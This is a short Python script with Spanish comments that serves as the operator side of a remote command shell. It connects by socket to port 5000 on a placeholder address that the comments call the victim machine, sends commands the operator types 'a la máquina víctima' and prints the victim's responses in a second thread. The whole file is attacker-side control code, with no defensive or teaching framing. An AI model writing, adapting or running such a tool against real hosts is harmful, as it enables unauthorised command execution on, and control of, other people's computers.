from socket import socket
import threading

def recibir_datos(client_socket):
    while True:
        try:
            # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
            respuesta = client_socket.recv(4096)
            if not respuesta:
                break

            # Imprimimos la respuesta;
            print(respuesta.decode())
        except:
            break

def enviar_comandos(client_socket):
    while True:
        # Solicitamos al usuario que introduzca un comando
        comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
        if comando_enviar.lower() == 'exit':
            break

        # Enviamos el comando a la máquina víctima:
        client_socket.send(comando_enviar.encode())

if __name__ == "__main__":
    # Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
    server_address = ('tu_direccion_ip', 5000)

    # Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
    client_socket = socket()
    client_socket.connect(server_address)

    # Creamos los hilos para recibir datos y enviar comandos de forma concurrente
    hilo_recibir = threading.Thread(target=recibir_datos, args=(client_socket,))
    hilo_enviar = threading.Thread(target=enviar_comandos, args=(client_socket,))

    # Iniciamos los hilos
    hilo_recibir.start()
    hilo_enviar.start()

    # Esperamos a que ambos hilos terminen
    hilo_recibir.join()
    hilo_enviar.join()

    # Cerramos la conexión del socket cliente
    client_socket.close()
